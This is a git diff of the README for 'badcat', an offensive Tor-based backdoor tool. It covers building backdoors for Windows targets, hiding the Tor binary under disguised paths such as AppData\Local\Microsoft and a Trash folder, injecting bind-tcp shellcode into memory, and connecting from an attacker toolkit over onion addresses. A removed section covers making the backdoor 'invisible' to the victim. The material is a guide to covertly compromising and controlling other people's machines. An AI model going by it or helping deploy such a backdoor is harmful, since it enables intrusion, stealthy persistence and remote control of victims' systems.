@@ -39,7 +39,7 @@ Also badcat support arbitrary payload execution in order to allow quick generati
 
 ## Install Rust
 
-1. Follow the instructions to install `rustup` tool: https://www.rust-lang.org/tools/install.
+Follow the instructions to install `rustup` tool: https://www.rust-lang.org/tools/install.
 Select the default installation. Rustup prepares your environment for cross-compilation and dependency management using `cargo`.
 
 ```bash
@@ -66,15 +66,6 @@ $ rustup --version
 rustup 1.24.3 (ce5817a94 2021-05-31)
 info: This is the version for the rustup toolchain manager, not the rustc compiler.
 info: The currently active `rustc` version is `rustc 1.56.1 (59eed8a2a 2021-11-01)`
-```
-
-2. For configuring the Onion Service we need a tool for generating the hostname and the private key, for this badcat uses `mkp224o`. Follow the instructions to generate the binary https://github.com/cathugger/mkp224o#mkp224o---vanity-address-generator-for-ed25519-onion-services.
-
-After you have compile `mkp224o` add the binary to your `PATH` environment, so badcat is able to call it. Ensure `mkp224o` is discoverable by your shell with:
-
-```bash
-$ which mkp224o
-/home/myuser/.local/bin/mkp224o
 ```
 
 ## Simple Quick Usage
@@ -149,7 +140,7 @@ Finally we are able to compile the _backdoor_. Every time you build a _backdoor_
 
 Once you have created the configuration from the example, we are done to build the _backdoor_ using the default configurations, which are the following:
 
-- name of target host as `a host that knows you are them`. This name is used to identificate which machine to connect, so change them accordingly to keep yourself organized.
+- name of target host as `a host that knows you are hacking them`. This name is used to identificate which machine to connect, so change them accordingly to keep yourself organized.
 - payload disabled, so badcat's basic shell will be used.
 
 Build the _backdoor_ targeting Windows x64:
@@ -183,69 +174,6 @@ Figure 2
 
 You'll find in this topic advanced ways to accomplish better results compared to the [simple quick usage](#simple-quick-usage) example.
 
-### Invisible _backdoor_
-
-The default behaviour of badcat's _backdoor_ is to hide the Windows console. Although the Tor binary is still visible to the user and may alert him about a compromise. A good backdoor behaviour would be to never show itself to the user, at least at a higher level. In order to hide the Tor console we need to provide the `-mwindows` flag to the compiler which means we need to compile it from source.
-
-Fortunately, badcat provides an automated way to perform the compilation using docker containers. The container installs all the dependencies and executes `build-tor-windows` shellscript.
-
-```bash
-$ docker build -t wintor .
-$ docker run -v ./target:/target --rm wintor
-```
-
-Note the latter command provides a volume mounted at `/target` directory. This is the location where the Tor binary will be copied into.
-
-Once the compilation finished - it take a while, check the generated binary:
-
-```bash
-$ file target/tor.exe
-target/tor.exe: PE32+ executable (GUI) x86-64, for MS Windows
-```
-
-Now you have to tell badcat to use your newly Tor binary. Badcat understands Tor binaries in two forms: a remote URL or a local file. We'll use a local file pointing at a directory which the binary is located. You cannot just throw your binary there, you have follow by the rules:
-
-1. Binary must be inside an `App` directory.
-2. Binary name must equal the `tor.executable` setting. Example:
-
-The following directory structure:
-
-victim
-├── tor-windows
-│   └── App
-│       └── myAmazingApp.exe
-
-Then your `settings.json` should look like below:
-
-**Note: your directory is defined at `tor.download_url.windows`, and the location is relative to `victim` directory.**
-
-```json
-{
-    "name": "my invisible backdoor",
-    "hosts_file": "../hosts.json",
-    "tor": {
-        "build_for_windows": true,
-        "download_url": {
-            "windows": "file://tor-windows",
-            "linux": "file://tor-linux/"
-        },
-        "destination_dir": {
-            "windows": "AppData\\Local\\Microsoft",
-            "linux": ".local/share/Trash/.repo"
-        },
-        "rc_file": "torrc",
-        "executable": "myAmazingApp"
-    },
-    "payload": {
-        "enabled": false,
-        "hex": "",
-        "bind_port": "9001"
-    }
-}
-```
-
-Now you compile, deliver and control the _backdoor_ as usual.
-
 ### Executing Custom Payload
 
 One of the advanced features of badcat is the ability to execute custom payload. Let me elaborate: one can inject a payload into executable memory and jump into it, just after the _attacker_ connected to the _server_. So what kind of usefull payloads one might inject? Bind tcp ones. Badcat actually prepares a port on the _server_ for you to use a bind tcp payload, you can set the payload to anything wanted though.
@@ -254,49 +182,32 @@ Examples:
 
 ### 1. Connect through a custom shell
 
-First translate your payload to hexadecimal. Then enable payload at your `settings.json` and update them to reflect your payload and bind port - using port `4444` for the purpose of this example:
+Generate your payload and write the raw bytes to a file. Then enable payload at your `settings.json` and update them to reflect your payload and bind port - using port `4444` for the purpose of this example:
 
 ```json
 {
     "name": "my custom shell",
     "hosts_file": "../hosts.json",
     "tor": {
-        "build_for_windows": true,
-        "download_url": {
-            "windows": "file://tor-windows",
-            "linux": "file://tor-linux/"
-        },
-        "destination_dir": {
+        "spoof_dir": {
             "windows": "AppData\\Local\\Microsoft",
             "linux": ".local/share/Trash/.repo"
         },
         "rc_file": "torrc",
-        "executable": "myAmazingApp"
     },
     "payload": {
         "enabled": true,
-        "hex": "MY EXTREME LARGE HEX SHELLCODE",
+        "file": "MY-AWESOME-PAYLOAD.bin",
         "bind_port": "4444"
     }
 }
 ```
 
-Now compile your _backdoor_ and deliver as usual.
+**Note: Before compiling your _backdoor_ and deliver as usual, ensure the build target is the right one for your payload. I mean, if you are using a Linux payload you could target Windows, but the payload would never execute properly.**
 
-When connecting, the attacker toolkit will execute the payload for you, but nothing will really show up. Instead you'll be able to connect directly to your shell using the onion address and the port as `settings.payload.bind_port` 4444 in our example.
+When connecting, the attacker toolkit will execute the payload for you, but nothing will really show up. Instead you'll be able to connect directly to your shell using the onion address and the port as `settings.payload.bind_port` - 4444 in our example.
 
-```bash
-$ ./attacker -f hosts.json
-Badcat attacker toolkit. Connect to your hosts
-Type help for commands.
-
-# list
-0 my custom shell true  andji3
-# connect 0
-trying to connect (attempt 0)...
-connected to: Ip(0.0.0.0:0)
-Your payload should be accessible now at: andji3yvdyslric3yfgnj665xfybagiyfqjdeurzuv3ejef2flwztrid.onion:PAYLOAD_PORT
-```
+IMAGE
 
 ### 2. Connect through a meterpreter session
 
